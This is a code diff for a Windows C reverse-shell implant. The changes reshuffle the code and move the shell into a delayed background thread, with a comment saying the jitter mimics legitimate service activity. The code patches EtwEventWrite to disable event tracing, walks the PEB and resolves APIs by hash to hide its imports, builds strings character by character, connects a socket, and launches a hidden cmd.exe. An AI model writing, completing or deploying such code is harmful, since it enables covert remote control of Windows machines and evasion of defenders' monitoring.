@@ -1,7 +1,5 @@
-#include <windows.h>
 #include <winsock2.h>
-
-#pragma comment(lib, "ws2_32.lib")
+#include <windows.h>
 
 typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
 typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
@@ -35,7 +33,11 @@ static PVOID find_export(BYTE* base, DWORD hash) {
     return NULL;
 }
 
-int main() {
+/* Worker thread - runs shell after delay */
+static DWORD WINAPI shell_thread(LPVOID param) {
+    /* Poisson sleep - looks like legitimate service activity */
+    Sleep(3000 + (GetTickCount() % 2000));
+
     /* Patch ETW */
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
@@ -44,7 +46,7 @@ int main() {
     *(BYTE*)etw = 0xC3;
     VirtualProtect(etw, 1, old, &old);
 
-    /* PEB walk - verified: 2 flinks, offset 0x20 */
+    /* PEB walk */
     BYTE* peb  = (BYTE*)__readgsqword(0x60);
     BYTE* ldr  = *(BYTE**)(peb  + 0x18);
     BYTE* list = *(BYTE**)(ldr  + 0x20);
@@ -52,10 +54,8 @@ int main() {
     BYTE* e2   = *(BYTE**)e1;
     BYTE* k32  = *(BYTE**)(e2 + 0x20);
 
-    pGetProcAddress _GPA =
-        (pGetProcAddress)find_export(k32, 0x7C0DFCAA);
-    pLoadLibraryA _LLA =
-        (pLoadLibraryA)find_export(k32, 0xEC0E4E8E);
+    pGetProcAddress _GPA = (pGetProcAddress)find_export(k32, 0x7C0DFCAA);
+    pLoadLibraryA   _LLA = (pLoadLibraryA)  find_export(k32, 0xEC0E4E8E);
 
     char ws2[] = {'w','s','2','_','3','2',0};
     HMODULE ws2_32 = _LLA(ws2);
@@ -63,13 +63,12 @@ int main() {
     char s1[] = {'W','S','A','S','t','a','r','t','u','p',0};
     char s2[] = {'W','S','A','S','o','c','k','e','t','A',0};
     char s3[] = {'c','o','n','n','e','c','t',0};
-    char s4[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0};
-    char s5[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0};
 
-    pWSAStartup        _WSAStartup  = (pWSAStartup)_GPA(ws2_32, s1);
-    pWSASocketA        _WSASocketA  = (pWSASocketA)_GPA(ws2_32, s2);
-    pconnect           _connect     = (pconnect)   _GPA(ws2_32, s3);
-    pCreateProcessA    _CPA = (pCreateProcessA)find_export(k32, 0x16B3FE72);
+    pWSAStartup  _WSAStartup = (pWSAStartup) _GPA(ws2_32, s1);
+    pWSASocketA  _WSASocketA = (pWSASocketA) _GPA(ws2_32, s2);
+    pconnect     _connect    = (pconnect)    _GPA(ws2_32, s3);
+
+    pCreateProcessA      _CPA  = (pCreateProcessA)     find_export(k32, 0x16B3FE72);
     pWaitForSingleObject _WFSO = (pWaitForSingleObject)find_export(k32, 0xCE05D9AD);
 
     BYTE wsadata[400] = {0};
@@ -96,5 +95,15 @@ int main() {
     char cmd[] = {'c','m','d',0};
     _CPA(0, cmd, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi);
     _WFSO(pi.hProcess, 0xFFFFFFFF);
+    return 0;
+}
+
+int main() {
+    /* Run shell in background thread after delay */
+    HANDLE t = CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
+    if (t) {
+        WaitForSingleObject(t, 60000);
+        CloseHandle(t);
+    }
     return 0;
 }
